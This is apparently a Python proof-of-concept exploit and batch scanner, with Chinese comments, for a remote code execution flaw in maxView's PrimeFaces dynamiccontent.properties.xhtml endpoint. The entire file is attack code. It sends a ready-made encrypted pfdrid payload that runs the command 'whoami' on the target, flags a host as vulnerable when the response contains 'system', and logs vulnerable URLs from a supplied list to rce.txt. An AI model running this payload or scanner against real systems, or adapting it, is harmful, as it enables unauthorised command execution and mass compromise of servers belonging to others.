import requests
import argparse


def checkvul(url):
    # post提交数据
    data = '''pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami'''
    # 头部信息
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Uer-Agent': 'ua.Edge'
    }
    # 拼接漏洞地址
    url1 = url + '/maxview/manager/javax.faces.resource/dynamiccontent.properties.xhtml'
    # 验证漏洞存在与否
    try:
        filename = 'rce.txt'
        res = requests.post(url1, data=data, headers=headers, timeout=6, verify=False)
        a = res.text
        #print(a)
        if 'system' in a:
            with open(filename, 'a') as f:
                f.write(url + '\n')
                print(f'{url}存在漏洞')
        else:
            print('不存在漏洞')
    except Exception as e:
        print(f'发生错误{e}')


# 批量检测
def checkvuls(filename):
    with open(filename, 'r') as f:
        for f in f.readlines():
            checkvul(f.strip())


# banner帮助信息
def banner():
    print('-u http://www.xxx.com  即可进行单个url漏洞检测')
    print('-l targetUrl.txt  即可对选中文档中的网址进行批量检测')
    print('--help 查看更多详细帮助信息')
    print('author：yui14256')


# 主程序
def main():
    arg = argparse.ArgumentParser(description='maxView 系统dynamiccontent.properties.xhtml 远程代码执行')
    arg.add_argument('-u', help='输入需要检测的url地址')
    arg.add_argument('-l', help='输入需要批量检测的url文件')
    args = arg.parse_args()
    try:
        if args.u or args.l:
            if args.u:
                checkvul(f'{args.u}')
            else:
                checkvuls(f'{args.l}')
        else:
            banner()
    except:
        print('运行出现错误')


if __name__ == '__main__':
    main()


if __name__ == "__main__":
    main()

